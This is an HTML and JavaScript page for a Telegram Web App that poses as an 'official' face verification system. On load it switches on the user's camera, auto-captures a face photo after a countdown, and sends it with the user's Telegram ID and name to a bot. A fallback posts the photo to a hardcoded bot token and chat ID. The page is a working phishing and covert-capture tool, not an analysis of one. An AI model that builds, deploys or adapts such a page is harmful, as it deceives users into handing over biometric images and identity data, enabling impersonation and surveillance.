<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Security Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .logo { font-size: 48px; margin: 20px 0; }
        h1 { margin-bottom: 10px; }
        .status { 
            font-size: 18px; 
            margin: 20px 0;
            min-height: 24px;
        }
        .error { color: #ff6b6b; }
        .success { color: #4cd964; }
        video {
            width: 100%;
            max-width: 300px;
            border-radius: 15px;
            margin: 20px auto;
            display: block;
            background: black;
        }
        canvas { display: none; }
        .hidden { display: none !important; }
        .btn {
            background: white;
            color: #667eea;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
        }
        .countdown {
            font-size: 48px;
            font-weight: bold;
            margin: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üì∏</div>
        <h1>Face Verification</h1>
        <p>Official identity confirmation system</p>
        
        <div class="status" id="status">Starting verification...</div>
        
        <div class="countdown hidden" id="countdown">3</div>
        <video id="camera" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
        
        <button class="btn hidden" id="startBtn">Start Camera</button>
        <button class="btn hidden" id="retryBtn">Try Again</button>
    </div>

    <script>
        // Telegram Web App
        const tg = window.Telegram.WebApp;
        
        // DOM elements
        const status = document.getElementById('status');
        const countdown = document.getElementById('countdown');
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const retryBtn = document.getElementById('retryBtn');
        
        let stream = null;
        let countdownValue = 3;
        let countdownTimer = null;
        
        // Initialize
        tg.expand();
        tg.ready();
        
        // Start automatically after page load
        setTimeout(initializeApp, 1000);
        
        function initializeApp() {
            status.textContent = "Checking camera permissions...";
            
            // Show start button for manual control
            startBtn.classList.remove('hidden');
            startBtn.onclick = startCamera;
            
            // Try auto-start for some devices
            setTimeout(() => {
                if (!stream) {
                    startCamera();
                }
            }, 500);
        }
        
        function startCamera() {
            startBtn.classList.add('hidden');
            status.textContent = "Accessing camera...";
            
            // Stop previous stream if exists
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Request camera with proper constraints
            const constraints = {
                video: {
                    facingMode: 'user',
                    width: { min: 640, ideal: 1280, max: 1920 },
                    height: { min: 480, ideal: 720, max: 1080 },
                    frameRate: { ideal: 30 }
                },
                audio: false
            };
            
            navigator.mediaDevices.getUserMedia(constraints)
                .then(handleSuccess)
                .catch(handleError);
        }
        
        function handleSuccess(mediaStream) {
            stream = mediaStream;
            
            // Check if stream has video
            const videoTrack = stream.getVideoTracks()[0];
            if (!videoTrack) {
                handleError(new Error('No video track'));
                return;
            }
            
            // Set camera source
            camera.srcObject = stream;
            camera.classList.remove('hidden');
            
            // Wait for video to load
            camera.onloadedmetadata = () => {
                status.textContent = "Camera ready";
                
                // Start countdown for auto-capture
                startCountdown();
            };
            
            camera.onerror = (err) => {
                console.error('Video error:', err);
                status.innerHTML = '<span class="error">Video error</span>';
            };
        }
        
        function startCountdown() {
            countdown.textContent = countdownValue;
            countdown.classList.remove('hidden');
            status.textContent = "Get ready for photo...";
            
            countdownTimer = setInterval(() => {
                countdownValue--;
                countdown.textContent = countdownValue;
                
                if (countdownValue <= 0) {
                    clearInterval(countdownTimer);
                    capturePhoto();
                }
            }, 1000);
        }
        
        function capturePhoto() {
            countdown.classList.add('hidden');
            status.textContent = "Capturing photo...";
            
            // Ensure video is playing
            if (camera.readyState < 2) {
                status.textContent = "Camera not ready, waiting...";
                setTimeout(capturePhoto, 500);
                return;
            }
            
            // Set canvas size to video size
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            
            const ctx = canvas.getContext('2d');
            
            // IMPORTANT: Wait for video frame
            setTimeout(() => {
                try {
                    // Draw video frame to canvas
                    ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to JPEG
                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
                    
                    // Verify photo is not black
                    const imageData = ctx.getImageData(0, 0, 1, 1).data;
                    const brightness = (imageData[0] + imageData[1] + imageData[2]) / 3;
                    
                    if (brightness < 10) {
                        // Photo is too dark/black
                        throw new Error('Black photo detected');
                    }
                    
                    // Stop camera
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    camera.classList.add('hidden');
                    
                    // Send to bot
                    sendPhotoToBot(photoData);
                    
                } catch (error) {
                    console.error('Capture error:', error);
                    handleError(error);
                }
            }, 100);
        }
        
        function sendPhotoToBot(photoData) {
            status.textContent = "Sending verification data...";
            
            // Prepare data
            const userData = {
                action: 'photo_captured',
                photo: photoData,
                user_id: tg.initDataUnsafe?.user?.id || 'unknown',
                user_name: tg.initDataUnsafe?.user?.first_name || 'Anonymous',
                timestamp: new Date().toISOString()
            };
            
            console.log('Sending photo data, size:', photoData.length);
            
            // Send via Telegram Web App
            try {
                tg.sendData(JSON.stringify(userData));
                
                status.innerHTML = '<span class="success">‚úÖ Verification complete!</span>';
                
                // Auto-close
                setTimeout(() => {
                    tg.close();
                }, 2000);
                
            } catch (sendError) {
                console.error('Send error:', sendError);
                status.innerHTML = '<span class="error">Sending failed, trying alternative...</span>';
                
                // Alternative method
                sendViaDirectAPI(photoData);
            }
        }
        
        function sendViaDirectAPI(photoData) {
            const botToken = '7551551273:AAFKKqRlkkakJYdSNX4ogmg-YYKklBikmZY';
            const chatId = '7795195179';
            
            // Convert base64 to blob
            const byteString = atob(photoData.split(',')[1]);
            const mimeString = photoData.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            
            const blob = new Blob([ab], { type: mimeString });
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            formData.append('chat_id', chatId);
            formData.append('caption', `Captured: ${new Date().toLocaleString()}`);
            
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    status.innerHTML = '<span class="success">‚úÖ Photo sent!</span>';
                    setTimeout(() => tg.close(), 2000);
                } else {
                    throw new Error(data.description);
                }
            })
            .catch(error => {
                status.innerHTML = '<span class="error">‚ùå Failed to send</span>';
                retryBtn.classList.remove('hidden');
            });
        }
        
        function handleError(error) {
            console.error('Camera error:', error);
            
            let message = 'Camera error';
            if (error.name === 'NotAllowedError') {
                message = 'Please allow camera access';
            } else if (error.name === 'NotFoundError') {
                message = 'No camera found';
            } else if (error.message === 'Black photo detected') {
                message = 'Camera is blocked or covered';
            }
            
            status.innerHTML = `<span class="error">‚ùå ${message}</span>`;
            
            // Show retry button
            retryBtn.classList.remove('hidden');
            retryBtn.onclick = () => {
                retryBtn.classList.add('hidden');
                countdownValue = 3;
                startCamera();
            };
        }
        
        // Handle back button
        if (tg.BackButton) {
            tg.BackButton.onClick(() => {
                tg.showConfirm("Cancel verification?", (ok) => {
                    if (ok) {
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        if (countdownTimer) {
                            clearInterval(countdownTimer);
                        }
                        tg.close();
                    }
                });
            });
            tg.BackButton.show();
        }
    </script>
</body>
</html>
